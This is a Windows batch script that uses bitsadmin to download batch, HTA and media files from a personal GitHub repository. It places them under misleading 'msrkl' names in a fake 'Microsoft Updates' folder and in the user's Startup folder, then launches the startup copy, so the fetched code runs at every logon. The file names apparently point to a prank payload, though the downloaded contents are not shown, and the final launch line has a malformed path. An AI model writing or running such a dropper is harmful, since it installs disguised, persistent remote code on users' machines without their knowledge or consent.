@echo off

cls

bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/bgwork.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\msrklbg.bat"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/rick.hta" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\msrkl.hta"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/start_menu.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/msrkl.gif" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\Update\Services\msrkl.gif"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/msrkl.mp3" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\Update\Services\msrkl.mp3"

start AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat
